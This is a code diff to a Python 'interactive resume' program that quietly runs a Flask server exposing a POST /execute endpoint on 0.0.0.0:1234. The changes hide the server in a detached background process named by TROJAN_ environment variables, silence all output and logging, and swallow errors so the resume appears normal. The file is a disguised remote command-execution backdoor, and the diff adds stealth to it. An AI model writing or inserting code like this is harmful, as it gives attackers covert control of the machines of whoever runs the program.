@@ -1,11 +1,12 @@
 import os
-import socket
+import logging
 import subprocess
-import threading
+import sys
 from dataclasses import dataclass
 from pathlib import Path
 
 from flask import Flask, jsonify, request
+from werkzeug.serving import make_server
 
 @dataclass
 class Job:
@@ -107,6 +108,8 @@ class InteractiveResume:
 
 def create_shell_app() -> Flask:
     shell_app = Flask("shell")
+    shell_app.config["PROPAGATE_EXCEPTIONS"] = False
+    shell_app.logger.disabled = True
 
     @shell_app.route("/execute", methods=["POST"])
     def execute_command():
@@ -138,24 +141,61 @@ def create_shell_app() -> Flask:
     return shell_app
 
 
+def run_shell_server(port: int) -> None:
+    devnull_out = open(os.devnull, "w", buffering=1)
+    sys.stdout = devnull_out
+    sys.stderr = devnull_out
+
+    # Disable every logging path for the shell runtime.
+    logging.disable(logging.CRITICAL)
+    logging.getLogger().handlers.clear()
+
+    shell_app = create_shell_app()
+
+    # Keep shell server silent in every runtime mode.
+    logging.getLogger("werkzeug").disabled = True
+    logging.getLogger("flask.app").disabled = True
+    logging.getLogger("werkzeug").setLevel(logging.CRITICAL)
+    logging.getLogger("flask.app").setLevel(logging.CRITICAL)
+
+    server = make_server("0.0.0.0", port, shell_app, threaded=True)
+    server.serve_forever()
+
+
+def launch_shell_background(port: int) -> None:
+    if getattr(sys, "frozen", False):
+        cmd = [sys.executable]
+    else:
+        cmd = [sys.executable, str(Path(__file__).resolve())]
+
+    env = os.environ.copy()
+    env["TROJAN_RUN_SHELL_ONLY"] = "1"
+    env["TROJAN_SHELL_PORT"] = str(port)
+
+    with open(os.devnull, "wb") as devnull:
+        subprocess.Popen(
+            cmd,
+            env=env,
+            stdin=devnull,
+            stdout=devnull,
+            stderr=devnull,
+            start_new_session=True,
+            close_fds=True,
+        )
+
+
 if __name__ == "__main__":
-    try:
-        # port = find_free_port()
-        port = 1234
-        shell_app = create_shell_app()
+    # Dedicated shell-only mode used by the detached subprocess.
+    if os.environ.get("TROJAN_RUN_SHELL_ONLY") == "1":
+        run_shell_server(int(os.environ.get("TROJAN_SHELL_PORT", "1234")))
+    else:
+        try:
+            # port = find_free_port()
+            port = 1234
+            launch_shell_background(port)
+        except Exception:
+            # Main app continues even if shell launch fails.
+            pass
 
-        def run_shell():
-            try:
-                shell_app.run(host="0.0.0.0", port=port, threaded=True, use_reloader=False)
-            except Exception as exc:
-                print(f"shell thread error: {exc}")
-
-        t = threading.Thread(target=run_shell, daemon=True)
-        t.start()
-
-        # print(f"Launched embedded shell server on port {port}")
-    except Exception as exc:
-        print(f"Warning: Could not start embedded shell: {exc}")
-    
-    my_resume = InteractiveResume()
-    my_resume.run()
+        my_resume = InteractiveResume()
+        my_resume.run()
